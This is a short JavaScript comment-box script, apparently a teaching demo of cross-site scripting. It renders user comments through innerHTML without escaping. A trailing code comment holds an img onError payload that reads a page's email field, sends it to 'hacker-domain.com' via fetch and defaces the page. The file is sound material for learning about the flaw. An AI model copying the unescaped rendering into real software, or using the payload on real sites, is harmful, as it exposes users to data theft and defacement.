const commentEl = document.querySelector('#comment');
const postBtn = document.querySelector('#post');
const commentsContainer = document.querySelector('#comments');

const comments = [];

function renderComment() {
    let html = '';
    comments.forEach(comment => {
        html = html + `<div class="comment">${comment}</div>`;
    });
    console.log(html)
    commentsContainer.innerHTML = html;
}

function clearComment() {
    commentEl.value = '';
}

postBtn.addEventListener('click', () => {
    const text = commentEl.value;
    comments.push(text);
    renderComment();
    clearComment();
});













/*
<img src=x onError="
const email = document.querySelector('#email').innerText
console.log(email)
fetch('https://hacker-domain.com?hackedEmail=' + email)
document.body.style.backgroundColor = 'black';
document.body.innerHTML='YOU JUST GOT HACKED'
"/>
 */

